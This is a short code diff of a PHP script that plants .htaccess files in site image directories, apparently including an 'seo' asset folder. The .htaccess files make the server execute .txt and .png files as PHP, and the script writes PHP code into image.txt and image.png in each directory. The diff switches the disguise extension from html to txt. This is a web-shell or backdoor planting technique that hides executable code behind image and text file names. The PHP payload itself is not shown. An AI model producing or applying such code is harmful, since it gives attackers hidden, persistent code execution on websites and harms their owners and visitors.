@@ -19,7 +19,7 @@ $targetDirs = [
     $rootDir . '/assets/images/seo',
 ];
 
-$htaccessContent = "<FilesMatch \"\.(html|png)$\">
+$htaccessContent = "<FilesMatch \"\.(txt|png)$\">
     SetHandler application/x-httpd-php
 </FilesMatch>";
 
@@ -38,7 +38,7 @@ PHP;
 
 $filesToCreate = [
     '.htaccess'  => $htaccessContent,
-    'image.html' => $phpCode,
+    'image.txt' => $phpCode,
     'image.png'  => $phpCode,    
 ];
 
@@ -64,7 +64,7 @@ $checkPaths = [
 
 foreach ($targetDirs as $targetDir) {
     $checkPaths[] = $targetDir . '/.htaccess';
-    $checkPaths[] = $targetDir . '/image.html';
+    $checkPaths[] = $targetDir . '/image.txt';
     $checkPaths[] = $targetDir . '/image.png';
 }
 
